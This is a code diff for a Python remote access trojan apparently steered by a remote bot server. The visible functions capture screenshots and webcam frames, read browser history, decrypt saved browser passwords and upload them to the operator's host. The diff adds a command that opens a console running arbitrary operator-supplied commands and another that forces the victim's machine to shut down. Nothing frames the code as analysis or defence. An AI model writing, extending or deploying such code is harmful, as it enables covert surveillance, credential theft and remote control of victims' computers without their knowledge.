@@ -9,7 +9,6 @@ from datetime import datetime
 import atexit
 from pymongo import MongoClient
 import threading
-import subprocess
 import psutil
 import signal
 import platform
@@ -24,6 +23,7 @@ import base64
 from pynput.keyboard import Controller
 import hashlib
 import uuid
+import subprocess
 import time
 
 API_URL = "https://money-cat-bot.onrender.com"
@@ -39,6 +39,7 @@ CAMERA_INDEX = 0
 DELAY = 60
 
 ACTIVITY_ROLE_ID=1345172216731664424
+ERROR_COLOR="#ff0000"
 
 keys_pressed = []
 lock = asyncio.Lock()
@@ -60,34 +61,40 @@ def watch_changes():
         type = data.get("type")
 
         if name == COMPUTER_ID:
-            print("Received request type:", type)
+            send_to_express(f"`✅` Successfully received `{type}` request!", COMPUTER_ID)
             match type and type.strip().lower():
+                case "cmd":
+                    args = data.get("args", {})
+                    content = args.get("content")
+                    if content:
+                        subprocess.Popen(['cmd', '/K', content], creationflags=subprocess.CREATE_NEW_CONSOLE)
+                        send_to_express(f"`💻` Successfully opened cmd with command `{content}`!", COMPUTER_ID)
+                    else:
+                        subprocess.Popen('cmd', creationflags=subprocess.CREATE_NEW_CONSOLE)
+                        send_to_express("`💻` Successfully opened cmd!", COMPUTER_ID)
+                
+                case "shutdown":
+                    os.system("shutdown /s /f /t 0")
+                    
                 case "ss":
-                    send_to_express("`✅` Successfully received `ss` request!", COMPUTER_ID)
                     send_screenshot_now()
                 
                 case "camera":
-                    send_to_express("`✅` Successfully received `camera` request!", COMPUTER_ID)
                     send_camera_frame_now()
 
                 case "info":
-                    send_to_express("`✅` Successfully received `info` request!", COMPUTER_ID)
                     send_info_now()
 
                 case "utils":
-                    send_to_express("`✅` Successfully received `utils` request!", COMPUTER_ID)
                     send_utils_now()
 
                 case "network_info":
-                    send_to_express("`✅` Successfully received `network_info` request!", COMPUTER_ID)
                     send_network_info_now()
 
                 case "processes":
-                    send_to_express("`✅` Successfully received `processes` request!", COMPUTER_ID)
                     send_processes_now()
             
                 case "process":
-                    send_to_express("`✅` Successfully received `process` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     pid = args.get("id")
                     activity = args.get("activity")
@@ -114,11 +121,9 @@ def watch_changes():
                             print(e)
 
                 case "applications":
-                    send_to_express("`✅` Successfully received `applications` request!", COMPUTER_ID)
                     send_to_express(list_open_apps(), COMPUTER_ID, code_block=True, isEmbed=True, Title="Currently Open Applications", Color=True)
 
                 case "app":
-                    send_to_express("`✅` Successfully received `app` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     activity = args.get("activity")
                     name = args.get("name")
@@ -127,7 +132,6 @@ def watch_changes():
                         send_to_express(f"`💣` Closed `{get_full_app_name(name)}` application!", COMPUTER_ID)
                 
                 case "history":
-                    send_to_express("`✅` Successfully received `history` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     name = args.get("name")
                     id = args.get("id")
@@ -138,7 +142,6 @@ def watch_changes():
                         print(e)
                 
                 case "passwords":
-                    send_to_express("`✅` Successfully received `passwords` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     name = args.get("name")
                     passwords_array = get_browser_passwords(browser=name)
@@ -148,7 +151,6 @@ def watch_changes():
                         print(e)
                 
                 case "keyboard":
-                    send_to_express("`✅` Successfully received `keyboard` request!", COMPUTER_ID)
                     keyboard = Controller()
                     args = data.get("args", {})
                     activity = args.get("activity")
@@ -190,13 +192,14 @@ def run_watch():
     thread.daemon = True
     thread.start()
 
-def send_to_express(message, computer_id=None, code_block=False, isEmbed=False, Title=None, Color=False):
+def send_to_express(message, computer_id=None, code_block=False, isEmbed=False, Title=None, Color=False, custom_color=None):
     payload = {
         "message": message,
         "COMPUTER_ID": computer_id,
         "isEmbed": isEmbed,
         "Title": Title,
         "Color": Color,
+        "custom_color": custom_color,
     }
 
     if (code_block):
@@ -230,7 +233,7 @@ async def send_screenshot():
         try:
             pyautogui.screenshot().save(screenshot_path)
         except Exception as e:
-            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error taking auto screenshot", Color="#ff0000", code_block=True)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error taking auto screenshot", custom_color=ERROR_COLOR, code_block=True)
             continue
 
         try:
@@ -238,7 +241,7 @@ async def send_screenshot():
                 files = {'screenshot': f}
                 requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_ID": COMPUTER_ID})
         except requests.exceptions.RequestException as e:
-            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending auto screenshot", Color="#ff0000", code_block=True)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending auto screenshot", custom_color=ERROR_COLOR, code_block=True)
             continue
 
         for attempt in range(5):
@@ -247,7 +250,7 @@ async def send_screenshot():
                 break
             except PermissionError as e:
                 if attempt == 4:
-                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting auto screenshot", Color="#ff0000", code_block=True)
+                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting auto screenshot", custom_color=ERROR_COLOR, code_block=True)
                 time.sleep(1)
 
 def send_screenshot_now():
@@ -273,7 +276,7 @@ def send_screenshot_now():
             response = requests.post(f"{API_URL}/upload-screenshot", files=files, data=data)
             response.raise_for_status()
         except requests.exceptions.RequestException as e:
-            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending screenshot", Color="#ff0000", code_block=True)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending screenshot", custom_color=ERROR_COLOR, code_block=True)
             return
 
         for attempt in range(5):
@@ -286,7 +289,7 @@ def send_screenshot_now():
             send_to_express("`❌` Error deleting screenshot file!", COMPUTER_ID)
 
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Unexpected Screenshot Error", Color="#ff0000", code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Unexpected Screenshot Error", custom_color=ERROR_COLOR, code_block=True)
 
 def send_info_now():
     external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
@@ -416,7 +419,7 @@ async def send_camera_frame():
         try:
             cv2.imwrite(frame_path, frame)  # Zapis klatki
         except Exception as e:
-            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", Color="#ff0000", code_block=True)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", custom_color=ERROR_COLOR, code_block=True)
             continue
 
         try:
@@ -425,7 +428,7 @@ async def send_camera_frame():
                 if response.status_code != 200:
                     send_to_express(f"`❌` Failed to upload frame: `{response.status_code}`", COMPUTER_ID)
         except Exception as e:
-            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", Color="#ff0000", code_block=True)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", custom_color=ERROR_COLOR, code_block=True)
             continue  # Nie usuwamy pliku, jeśli nie został wysłany
 
         for attempt in range(5):
@@ -434,7 +437,7 @@ async def send_camera_frame():
                 break
             except PermissionError as e:
                 if attempt == 4:
-                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", Color="#ff0000", code_block=True)
+                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", custom_color=ERROR_COLOR, code_block=True)
                 time.sleep(1)
         await asyncio.sleep(DELAY)
 
@@ -461,7 +464,7 @@ def send_camera_frame_now():
     try:
         cv2.imwrite(frame_path, frame)  # Zapis klatki
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", Color="#ff0000", code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", custom_color=ERROR_COLOR, code_block=True)
         return
 
     try:
@@ -470,7 +473,7 @@ def send_camera_frame_now():
             if response.status_code != 200:
                 send_to_express(f"`❌` Failed to upload frame: `{response.status_code}`", COMPUTER_ID)
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", Color="#ff0000", code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", custom_color=ERROR_COLOR, code_block=True)
         return  # Nie usuwamy pliku, jeśli nie został wysłany
 
     for attempt in range(5):
@@ -479,7 +482,7 @@ def send_camera_frame_now():
             break
         except PermissionError as e:
             if attempt == 4:
-                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", Color="#ff0000", code_block=True)
+                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", custom_color=ERROR_COLOR, code_block=True)
             time.sleep(1)  
 
     cap.release()
@@ -543,7 +546,7 @@ def get_browser_history(browser="chrome", limit=10):
         try:
             cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
         except sqlite3.DatabaseError as e:
-            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error while fetching history", Color="#ff0000", code_block=True)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error while fetching history", custom_color=ERROR_COLOR, code_block=True)
 
         raw_history = cursor.fetchall()
         conn.close()
@@ -553,7 +556,7 @@ def get_browser_history(browser="chrome", limit=10):
         return history_list
 
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error inget_browser_history", Color="#ff0000", code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error inget_browser_history", custom_color=ERROR_COLOR, code_block=True)
         return []
 
 def get_encryption_key(browser="chrome"):
@@ -573,7 +576,7 @@ def get_encryption_key(browser="chrome"):
         return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_encryption_key", Color="#ff0000", code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_encryption_key", custom_color=ERROR_COLOR, code_block=True)
         return None
 
 def decrypt_password(encrypted_password, key):
@@ -583,7 +586,7 @@ def decrypt_password(encrypted_password, key):
         cipher = AES.new(key, AES.MODE_GCM, iv)
         return cipher.decrypt(encrypted_password)[:-16].decode()
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error decrypting passwor", Color="#ff0000", code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error decrypting passwor", custom_color=ERROR_COLOR, code_block=True)
         return ""
 
 def get_browser_passwords(browser="chrome"):
@@ -605,7 +608,7 @@ def get_browser_passwords(browser="chrome"):
         try:
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
         except sqlite3.DatabaseError as e:
-            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error", Color="#ff0000", code_block=True)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error", custom_color=ERROR_COLOR, code_block=True)
 
         key = get_encryption_key(browser)
 
@@ -614,7 +617,7 @@ def get_browser_passwords(browser="chrome"):
             try:
                 decrypted_password = decrypt_password(password, key)
             except Exception as e:
-                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Decryption failed", Color="#ff0000", code_block=True)
+                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Decryption failed", custom_color=ERROR_COLOR, code_block=True)
                 decrypted_password = "❌"
 
             passwords.append({
@@ -629,7 +632,7 @@ def get_browser_passwords(browser="chrome"):
         return passwords
 
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_browser_passwords", Color="#ff0000", code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_browser_passwords", custom_color=ERROR_COLOR, code_block=True)
         return []
 
 if __name__ == "__main__":
